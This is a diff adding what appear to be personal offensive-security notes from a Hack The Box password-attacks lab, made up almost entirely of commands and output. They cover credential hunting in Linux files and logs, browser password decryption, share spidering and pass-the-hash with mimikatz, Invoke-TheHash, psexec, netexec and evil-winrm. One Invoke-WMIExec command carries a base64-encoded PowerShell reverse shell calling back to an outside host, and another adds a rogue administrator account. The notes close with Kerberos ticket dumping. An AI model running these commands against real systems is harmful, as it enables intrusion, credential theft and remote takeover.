@@ -1112,11 +1112,1067 @@ cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgz
 ```
 mdmithu@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
 mdmithu@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
-mdmithu@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes```
+mdmithu@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
 ```
 ```
 /htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
 ```
+#### Credential Hunting in Linux
+
+```
+[/htb]$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+
+File extension:  .conf
+/run/tmpfiles.d/static-nodes.conf
+/run/NetworkManager/resolv.conf
+/run/NetworkManager/no-stub-resolv.conf
+/run/NetworkManager/conf.d/10-globally-managed-devices.conf
+...SNIP...
+/etc/ltrace.conf
+/etc/rygel.conf
+/etc/ld.so.conf.d/x86_64-linux-gnu.conf
+/etc/ld.so.conf.d/fake
+```
+```
+[/htb]$ for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+
+File:  /snap/core18/2128/etc/ssl/openssl.cnf
+challengePassword		= A challenge password
+
+File:  /usr/share/ssl-cert/ssleay.cnf
+
+File:  /etc/ssl/openssl.cnf
+challengePassword		= A challenge password
+
+File:  /etc/alternatives/my.cnf
+
+File:  /etc/mysql/my.cnf
+
+File:  /etc/mysql/debian.cnf
+
+File:  /etc/mysql/mysql.conf.d/mysqld.cnf
+user		= mysql
+
+File:  /etc/mysql/mysql.conf.d/mysql.cnf
+
+```
+```
+[/htb]$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+
+DB File extension:  .sql
+
+DB File extension:  .db
+/var/cache/dictionaries-common/ispell.db
+/var/cache/dictionaries-common/aspell.db
+/var/cache/dictionaries-common/wordlist.db
+/var/cache/dictionaries-common/hunspell.db
+/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
+/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
+/home/cry0l1t3/.cache/tracker/meta.db
+
+DB File extension:  .*db
+/var/cache/dictionaries-common/ispell.db
+/var/cache/dictionaries-common/aspell.db
+/var/cache/dictionaries-common/wordlist.db
+/var/cache/dictionaries-c
+```
+```
+[/htb]$ find /home/* -type f -name "*.txt" -o ! -name "*.*"
+
+/home/cry0l1t3/.config/caja/desktop-metadata
+/home/cry0l1t3/.config/clipit/clipitrc
+/home/cry0l1t3/.config/dconf/user
+/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
+/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
+<SNIP>
+```
+```
+[/htb]$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+File extension:  .py
+
+File extension:  .pyc
+
+File extension:  .pl
+
+File extension:  .go
+
+File extension:  .jar
+
+File extension:  .c
+
+File extension:  .sh
+/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
+/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
+/snap/core18/2128/etc/init.d/hwclock.sh
+/snap/core18/2128/etc/
+```
+```
+[/htb]$ cat /etc/crontab 
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+mdmithu@htb[/htb]$ ls -la /etc/cron.*/
+
+/etc/cron.d/:
+total 28
+drwxr-xr-x 1 root root  106  3. Jan 20:27 .
+drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
+-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
+-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
+-rw-r--r-- 1 root root  607 25. Jan 2021  john
+-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
+-rw-r--r-- 1 root root  712 11. Mai 2020  php
+-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
+-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat
+
+/etc/cron.daily/:
+total 68
+drwxr-xr-x 1 root root  252  6. Jan 16:24 .
+drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
+<SNIP>
+```
+```
+[/htb]$ tail -n5 /home/*/.bash*
+
+==> /home/cry0l1t3/.bash_history <==
+vim ~/testing.txt
+vim ~/testing.txt
+chmod 755 /tmp/api.py
+su
+/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK
+
+==> /home/cry0l1t3/.bashrc <==
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+```
+```
+[/htb]$ for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+
+#### Log file:  /var/log/dpkg.log.1
+2022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
+2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
+2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1 
+2022-01-10 17:5
+```
+```
+[/htb]$ sudo python3 mimipenguin.py
+
+[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY
+```
+```
+[/htb]$ sudo python2.7 laZagne.py all
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+------------------- Shadow passwords -----------------
+
+[+] Hash found !!!
+Login: systemd-coredump
+Hash: !!:18858::::::
+
+[+] Hash found !!!
+Login: sambauser
+Hash: $6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
+
+[+] Password found !!!
+Login: cry0l1t3
+Password: WLpAEXFa0SbqOHY
+```
+```
+[!bash]$ ls -l .mozilla/firefox/ | grep default 
+
+drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
+drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
+```
+```
+[/htb]$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+
+{
+  "nextId": 2,
+  "logins": [
+    {
+      "id": 1,
+      "hostname": "https://www.inlanefreight.com",
+      "httpRealm": null,
+      "formSubmitURL": "https://www.inlanefreight.com",
+      "usernameField": "username",
+      "passwordField": "password",
+      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
+      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
+      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
+      "encType": 1,
+      "timeCreated": 1643373110869,
+      "timeLastUsed": 1643373110869,
+      "timePasswordCh
+```
+```
+[/htb]$ python3.9 firefox_decrypt.py
+
+Select the Mozilla profile you wish to decrypt
+1 -> lfx3lvhb.default
+2 -> 1bplpd86.default-release
+
+2
+
+Website:   https://testing.dev.inlanefreight.com
+Username: 'test'
+Password: 'test'
+
+Website:   https://www.inlanefreight.com
+Username: 'cry0l1t3'
+Password: 'FzXUxJemKm6g2lGh'
+```
+```
+[/htb]$ python3 laZagne.py browsers
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+------------------- Firefox passwords -----------------
+
+[+] Password found !!!
+URL: https://testing.dev.inlanefreight.com
+Login: test
+Password: test
+
+[+] Password found !!!
+URL: https://www.inlanefreight.com
+Login: cry0l1t3
+```
+#### Credential Hunting in Network Traffic
+
+```
+b[/htb]$ ./Pcredz -f demo.pcapng -t -v
+
+Pcredz 2.0.2
+Author: Laurent Gaffie
+Please send bugs/comments/pcaps to: laurent.gaffie@gmail.com
+This script will extract NTLM (HTTP,LDAP,SMB,MSSQL,RPC, etc), Kerberos,
+FTP, HTTP Basic and credit card data from a given pcap file or from a live interface.
+
+CC number scanning activated
+
+Unknown format, trying TCPDump format
+
+[1746131482.601354] protocol: udp 192.168.31.211:59022 > 192.168.31.238:161
+Found SNMPv2 Community string: s3cr...SNIP...
+
+[1746131482.601640] protocol: udp 192.168.31.211:59022 > 192.168.
+```
+
+#### Credential Hunting in Network Shares
+
+```
+c:\Users\Public>Snaffler.exe -s
+
+ .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
+;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
+'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
+  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
+ 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
+  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
+                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler
+
+
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:42Z [Info] Parsing args...
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Parsed args successfully.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting DFS paths from AD.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Found 0 DFS Shares in 0 namespaces.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking full domain computer discovery.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting computers from AD.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Got 1 computers from AD.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Starting to look for readable shares...
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Created all sharefinder tasks.
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\ADMIN$>()
+[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\ADMIN$>(R) Remote Admin
+[INLANEFREIGHT\jbader@DC
+```
+```
+PS C:\Users\Public\PowerHuntShares> Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+
+ ===============================================================
+ INVOKE-HUNTSMBSHARES
+ ===============================================================
+  This function automates the following tasks:
+
+  o Determine current computer's domain
+  o Enumerate domain computers
+  o Check if computers respond to ping requests
+  o Filter for computers that have TCP 445 open and accessible
+  o Enumerate SMB shares
+  o Enumerate SMB share permissions
+  o Identify shares with potentially excessive privileges
+  o Identify shares that provide read or write access
+  o Identify shares thare are high risk
+  o Identify common share owners, names, & directory listings
+  o Generate last written & last accessed timelines
+  o Generate html summary report and detailed csv files
+
+  Note: This can take hours to run in large environments.
+ ---------------------------------------------------------------
+ |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+ ---------------------------------------------------------------
+ SHARE DISCOVERY
+ ---------------------------------------------------------------
+ [*][05/01/2025 12:51] Scan St
+```
+##### MANSPIDER
+```
+[/htb]$ docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+
+[+] MANSPIDER command executed: /usr/local/bin/manspider 10.129.234.121 -c passw -u mendres -p Inlanefreight2025!
+[+] Skipping files larger than 10.00MB
+[+] Using 5 threads
+[+] Searching by file content: "passw"
+[+] Matching files will be downloaded to /root/.manspider/loot
+[+] 10.129.234.121: Successful login as "mendres"
+[+] 10.129.234.121: Successful login as "mendres"
+<SNIP>
+```
+```
+[/htb]$ nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
+
+SMB         10.129.234.121  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:inlanefreight.local) (signing:True) (SMBv1:False)
+SMB         10.129.234.121  445    DC01             [+] inlanefreight.local\mendres:Inlanefreight2025! 
+SMB         10.129.234.121  445    DC01             [*] Started spidering
+SMB         10.129.234.121  445    DC01             [*] Spidering .
+<SNIP>
+```
+##### Pass the Hash (PtH)
+
+```
+c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
+
+user    : julio
+domain  : inlanefreight.htb
+program : cmd.exe
+impers. : no
+NTLM    : 64F12CDDAA88057E06A81B54E73B949B
+  |  PID  8404
+  |  TID  4268
+  |  LSA Process was already R/W
+  |  LUID 0 ; 5218172 (00000000:004f9f7c)
+  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
+  \_ kerberos - data copy @ 0000028FC964F288
+   \_ des_cbc_md4       -> null
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ des_cbc_md4       OK
+   \_ *Password replace @ 0000028FC9673AE8 (32) -> null
+```
+```
+PS c:\htb> cd C:\tools\Invoke-TheHash\
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
+
+VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10
+VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10
+VERBOSE: [*] Trying to execute command on 172.16.1.10
+[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10
+VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
+```
+[revshells](https://www.revshells.com/)
+```
+PS C:\tools> .\nc.exe -lvnp 8001
+
+listening on [any] 8001 ...
+```
+```
+PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
+PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAzACIALAA4ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
+
+[+] Command executed with process id 520 on DC01
+```
+```
+[/htb]$ impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.129.201.126.....
+[*] Found writable share ADMIN$
+[*] Uploading file SLUBMRXK.exe
+[*] Opening SVCManager on 10.129.201.126.....
+[*] Creating service AdzX on 10.129.201.126.....
+[*] Starting service AdzX.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.19044.1415]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+```
+```
+[/htb]# netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
+```
+```
+b[/htb]# netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
+
+SMB         10.129.201.126  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+SMB         10.129.201.126  445    MS01            [+] .\Administrator 30B3783CE2ABF1AF70F77D0660CF3453 (Pwn3d!)
+SMB         10.129.201.126  445    MS01            [+] Executed command 
+SMB         10.129.201.126  445    MS01            MS01\administrator
+```
+```
+[/htb]$ evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
+
+Evil-WinRM shell v3.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+```
+c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+```
+```
+[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
+
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
+[15:38:26:999] [94965:94966] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
+...snip...
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
+[15:38:26:352] [94965:94966] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+...SNIP...
+```
+
+#### Pass the Ticket (PtT) from Windows
+
+```
+c:\tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::tickets /export
+
+Authentication Id : 0 ; 329278 (00000000:0005063e)
+Session           : Network from 0
+User Name         : DC01$
+Domain            : HTB
+Logon Server      : (null)
+Logon Time        : 7/12/2022 9:39:55 AM
+SID               : S-1-5-18
+
+         * Username : DC01$
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+         
+        Group 0 - Ticket Granting Service
+
+        Group 1 - Client Ticket ?
+         [00000000]
+           Start/End/MaxRenew: 7/12/2022 9:39:55 AM ; 7/12/2022 7:39:54 PM ;
+           Service Name (02) : LDAP ; DC01.inlanefreight.htb ; inlanefreight.htb ; @ inlanefreight.htb
+           Target Name  (--) : @ inlanefreight.htb
+           Client Name  (01) : DC01$ ; @ inlanefreight.htb
+           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
+           Session Key       : 0x00000012 - aes256_hmac
+             31cfa427a01e10f6e09492f2e8ddf7f74c79a5ef6b725569e19d614a35a69c07
+           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
+           * Saved to file [0;5063e]-1-0-40a50000-DC01$@LDAP-DC01.inlanefreight.htb.kirbi !
+
+        Group 2 - Ticket Granting Ticket
+
+mimikatz # exit
+Bye!
+
+c:\tools> dir *.kirbi
+
+Directory: c:\tools
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+
+<SNIP>
+
+-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
+```
+```
+c:\tools> Rubeus.exe dump /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+Action: Dump Kerberos Ticket Data (All Users)
+
+[*] Current LUID    : 0x6c680
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  DC01$
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:39:54 AM
+    EndTime               :  7/12/2022 7:39:54 PM
+    RenewTill             :  7/19/2022 9:39:54 AM
+    Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  KWBMpM4BjenjTniwH0xw8FhvbFSf+SBVZJJcWgUKi3w=
+    Base64EncodedTicket   :
+
+doIE1jCCBNKgAwIBBaEDAgEWooID7TCCA+lhggPlMIID4aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB0hUQi5DT02jggOvMIIDq6ADAgESoQMCAQKiggOdBIIDmUE/AWlM6VlpGv+Gfvn6bHXrpRjRbsgcw9beSqS2ihO+FY/2Rr0g0iHowOYOgn7EBV3JYEDTNZS2ErKNLVOh0/TczLexQk+bKTMh55oNNQDVzmarvzByKYC0XRTjb1jPuVz4exraxGEBTgJYUunCy/R5agIa6xuuGUvXL+6AbHLvMb+ObdU7Dyn9eXruBscIBX5k3D3S5sNuEnm1sHVsGuDBAN5Ko6kZQRTx22A+lZZD12ymv9rh8S41z0+pfINdXx/VQAxYRL5QKdjbndchgpJro4mdzuEiu8wYOxbpJdzMANSSQiep+wOTUMgimcHCCCrhXdyR7VQoRjjdmTrKbPVGltBOAWQOrFs6YK1OdxBles1GEibRnaoT9qwEmXOa4ICzhjHgph36TQIwoRC+zjPMZl9lf+qtpuOQK86aG7Uwv7eyxwSa1/H0mi5B+un2xKaRmj/mZHXPdT7B5Ruwct93F2zQQ1mKIH0qLZO1Zv/G0IrycXxoE5MxMLERhbPl4Vx1XZGJk2a3m8BmsSZJt/++rw7YE/vmQiW6FZBO/2uzMgPJK9xI8kaJvTOmfJQwVlJslsjY2RAVGly1B0Y80UjeN8iVmKCk3Jvz4QUCLK2zZPWKCn+qMTtvXBqx80VH1hyS8FwU3oh90IqNS1VFbDjZdEQpBGCE/mrbQ2E/rGDKyGvIZfCo7t+kuaCivnY8TTPFszVMKTDSZ2WhFtO2fipId+shPjk3RLI89BT4+TDzGYKU2ipkXm5cEUnNis4znYVjGSIKhtrHltnBO3d1pw402xVJ5lbT+yJpzcEc5N7xBkymYLHAbM9DnDpJ963RN/0FcZDusDdorHA1DxNUCHQgvK17iametKsz6Vgw0zVySsPp/wZ/tssglp5UU6in1Bq91hA2c35l8M1oGkCqiQrfY8x3GNpMPixwBdd2OU1xwn/gaon2fpWEPFzKgDRtKe1FfTjoEySGr38QSs1+JkVk0HTRUbx9Nnq6w3W+D1p+FSCRZyCF/H1ahT9o0IRkFiOj0Cud5wyyEDom08wOmgwxK0D/0aisBTRzmZrSfG7Kjm9/yNmLB5va1yD3IyFiMreZZ2WRpNyK0G6L4H7NBZPcxIgE/Cxx/KduYTPnBDvwb6uUDMcZR83lVAQ5NyHHaHUOjoWsawHraI4uYgmCqXYN7yYmJPKNDI290GMbn1zIPSSL82V3hRbOO8CZNP/f64haRlR63GJBGaOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIClgTKTOAY3p4054sB9McPBYb2xUn/kgVWSSXFoFCot8oQkbB0hUQi5DT02iEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIyMDcxMjEzMzk1NFqmERgPMjAyMjA3MTIyMzM5NTRapxEYDzIwMjIwNzE5MTMzOTU0WqgJGwdIVEIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdIVEIuQ09N
+
+  UserName                 : plaintext
+  Domain                   : HTB
+  LogonId                  : 0x6c680
+  UserSID                  : S-1-5-21-228825152-3134732153-3833540767-1107
+  AuthenticationPackage    : Kerberos
+  LogonType                : Interactive
+  LogonTime                : 7/12/2022 9:42:15 AM
+  LogonServer              : DC01
+  LogonServerDNSDomain     : inlanefreight.htb
+  UserPrincipalName        : plaintext@inlanefreight.htb
+
+
+    ServiceName           :  krbtgt/inlanefreight.htb
+    ServiceRealm          :  inlanefreight.htb
+    UserName              :  plaintext
+    UserRealm             :  inlanefreight.htb
+    StartTime             :  7/12/2022 9:42:15 AM
+    EndTime               :  7/12/2022 7:42:15 PM
+    RenewTill             :  7/19/2022 9:42:15 AM
+    Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+    KeyType               :  aes256_cts_hmac_sha1
+    Base64(key)           :  2NN3wdC4FfpQunUUgK+MZO8f20xtXF0dbmIagWP0Uu0=
+    Base64EncodedTicket   :
+
